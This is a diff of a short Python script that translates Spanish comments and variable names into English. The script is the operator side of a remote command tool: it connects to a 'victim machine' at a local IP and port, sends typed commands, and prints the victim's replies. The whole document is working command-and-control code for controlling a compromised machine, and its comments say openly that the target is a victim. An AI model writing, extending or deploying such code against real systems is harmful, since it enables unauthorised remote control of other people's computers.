@@ -1,33 +1,31 @@
 from socket import socket
 
-
-# Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
+# Define the server address and port (Always of the victim machine)
 server_address = ('192.168.1.11', 5000)
 
-# Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
+# Create the client socket, as we re-establish the connection for each command executed
 client_socket = socket()
 client_socket.connect(server_address)
-estado = True
+state = True
 
-while estado:
+while state:
 
-    # Solicitamos al usuario que introduzca un comando
-    comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")
-    
+    # Ask the user to input a command
+    command_send = input("Enter the command you want to send to the victim machine (or 'exit' to quit): ")
 
-    # Si el usuario introduce "exit", cerramos la conexión y salimos del bucle
-    if comando_enviar == 'exit':
-        # Le decimos al servidor que la conexion la cerramos:
-        client_socket.send(comando_enviar.encode())
-        # Cerramos el socket, que se volverá a abrir al inicio del bucle:
+    # If the user enters "exit", close the connection and exit the loop
+    if command_send == 'exit':
+        # Tell the server that we are closing the connection:
+        client_socket.send(command_send.encode())
+        # Close the socket, which will reopen at the beginning of the loop:
         client_socket.close()
-        estado = False
+        state = False
     else:
-        # Enviamos el comando a la máquina víctima:
-        client_socket.send(comando_enviar.encode())
+        # Send the command to the victim machine:
+        client_socket.send(command_send.encode())
 
-        # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
-        respuesta = client_socket.recv(4096)
+        # Wait to receive the response from the victim and store it in the variable 'response'.
+        response = client_socket.recv(4096)
 
-        # Imprimimos la respuesta;
-        print(respuesta.decode()) 
+        # Print the response;
+        print(response.decode())
